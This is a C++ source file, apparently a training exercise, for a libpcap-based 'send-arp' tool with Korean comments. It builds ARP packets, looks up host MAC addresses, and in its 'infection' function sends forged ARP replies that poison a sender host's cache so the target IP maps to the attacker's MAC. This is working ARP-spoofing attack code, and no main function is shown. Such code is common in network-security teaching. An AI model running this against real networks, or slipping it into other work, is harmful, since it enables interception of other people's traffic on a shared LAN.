#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <utility>
#include "ethhdr.h"
#include "arphdr.h"
// getMyIp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
//
#define SUCCESS 1
#define FAIL -1

#pragma pack(push, 1) 
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;
using std::pair;
using std::vector;
using std::endl;

void usage() {
	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1" << endl;
}

int getMyMac(Mac& mac, char* dev) {
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	ifstream fin;
	string path = "/sys/class/net/" + string(dev) +"/address";
	fin.open(path);

	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}

	string tmp;
	fin >> tmp;
	mac = tmp;

	fin.close();
	return SUCCESS;
}

void fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type, EthArpPacket& packet) {
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);
}

int sendARP(EthArpPacket& packet, pcap_t* handle) {
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return FAIL;
	}
	return SUCCESS;
}

int parsePacket(pcap_t* handle, EthArpPacket& send, vector<pair<Ip, Mac>>& table) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;

	while (1) {
		int res = pcap_next_ex(handle, &pkheader, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}
		

		// ETH-ARP 패킷인지 확인하고 
		EthArpPacket header;
		memcpy(&header, packet, 42);
	
		// => ETH의 type정보를 확인
		if(header.eth_.type_ != htons(EthHdr::Arp)) continue;

		// reply 패킷인지 확인
		if(header.arp_.op_ != htons(ArpHdr::Reply)) continue;

		// send를 바탕으로 send에 대한 reply인지 확인
		if(send.eth_.smac_ != header.eth_.dmac_) continue;
		if(send.arp_.smac_ != header.arp_.tmac_) continue;
		if(send.arp_.sip_ != header.arp_.tip_) continue;
		if(send.arp_.tip_ != header.arp_.sip_) continue;

		header.arp_.sip_ = ntohl(header.arp_.sip_);
		table.push_back({header.arp_.sip_, header.arp_.smac_});
		return SUCCESS;
	}
}

int getMac(Ip& tip, pcap_t* handle, vector<pair<Ip, Mac>>& table) {
	EthArpPacket packet;
	fillPacket(table.begin()->second, Mac::broadcastMac(), table.begin()->second, table.begin()->first, Mac::nullMac(), tip, ArpHdr::Request, packet);
	
	return sendARP(packet, handle) && parsePacket(handle, packet, table);
}

uint32_t getMyIp(char* dev) {
	int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
    ioctl(fd, SIOCGIFADDR, &ifr);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    close(fd);
     
    return ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr);
}

int getMyInfo(char* dev, vector<pair<Ip, Mac>>& table) {
	Mac myMac;
	if(getMyMac(myMac, dev) == FAIL) return FAIL;
	table.push_back({Ip(getMyIp(dev)), myMac});
	return SUCCESS;
}

void infection(vector<pair<Ip, Mac>>& table, pcap_t* handle) {
	EthArpPacket packet;
	// table[0] : me
	// table[1] : sender
	// table[2] : target
	fillPacket(table[0].second, table[1].second, table[0].second, table[2].first, table[1].second, table[1].first, ArpHdr::Reply, packet);
	sendARP(packet, handle);
}

void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = Ip(string(argv[0]));
	target = Ip(string(argv[1]));
}

void printTable(vector <pair<Ip, Mac>>& table) {
	cout << "----Me----" << endl << "Ip:  " << string(table[0].first) << endl << "Mac: " << string(table[0].second) << endl;
	cout << "--Sender--" << endl << "Ip:  " << string(table[1].first) << endl << "Mac: " << string(table[1].second) << endl;
	cout << "--Target--" << endl << "Ip:  " << string(table[2].first) << endl << "Mac: " << string(table[2].second) << endl;
}